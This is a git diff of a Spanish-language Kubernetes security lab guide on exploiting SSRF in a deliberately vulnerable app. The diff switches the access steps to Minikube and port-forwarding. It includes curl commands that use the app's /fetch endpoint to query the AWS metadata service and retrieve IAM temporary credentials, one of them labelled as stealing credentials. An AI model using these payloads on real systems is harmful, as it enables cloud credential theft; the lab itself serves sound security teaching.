@@ -14,7 +14,7 @@ En julio de 2019, una ex-empleada de AWS explotó una vulnerabilidad SSRF en un 
 
 | Archivo | Descripción |
 |---------|-------------|
-| `vulnerable.yaml` | App Flask con SSRF, sin NetworkPolicy (puede alcanzar IMDS) |
+| `vulnerable.yaml` | App Python con SSRF, sin NetworkPolicy (puede alcanzar IMDS) |
 
 ---
 
@@ -23,20 +23,31 @@ En julio de 2019, una ex-empleada de AWS explotó una vulnerabilidad SSRF en un 
 ```bash
 kubectl apply -f vulnerable.yaml
 kubectl get pods -n lab1-ssrf -w
-# Esperar a que esté Running (puede tardar ~30s por pip install)
+# Esperar a que esté Running
 ```
 
 ## Fase 2: Explotación SSRF
 
-### Paso 1: Acceder a la app
+### Paso 1: Acceder a la app (Minikube)
 
 ```bash
-# Obtener la IP del nodo
-kubectl get nodes -o wide
-# Usar la IP INTERNAL del nodo
+# Opción A — usar minikube service (abre el navegador automáticamente)
+minikube service ssrf-app-svc -n lab1-ssrf
 
-# Acceder a la app via NodePort
-# http://<NODE-IP>:31082
+# Opción B — obtener la URL manualmente
+minikube service ssrf-app-svc -n lab1-ssrf --url
+# Ejemplo de salida: http://192.168.49.2:31082
+
+# Opción C — port-forward (funciona en cualquier entorno)
+kubectl port-forward svc/ssrf-app-svc 8080:8080 -n lab1-ssrf &
+# Luego acceder a http://localhost:8080
+```
+
+Guardar la URL en una variable para los siguientes pasos:
+
+```bash
+export APP_URL=$(minikube service ssrf-app-svc -n lab1-ssrf --url)
+echo "App disponible en: $APP_URL"
 ```
 
 ### Paso 2: Probar SSRF al IMDS (AWS)
@@ -45,13 +56,13 @@ kubectl get nodes -o wide
 # Desde el navegador o curl:
 
 # Listar metadata disponible
-curl "http://<NODE-IP>:31082/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl "$APP_URL/fetch?url=http://169.254.169.254/latest/meta-data/"
 
 # Obtener el IAM role del nodo
-curl "http://<NODE-IP>:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "$APP_URL/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 
 # Robar credenciales temporales
-curl "http://<NODE-IP>:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
+curl "$APP_URL/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
 # → AccessKeyId, SecretAccessKey, Token
 ```
 
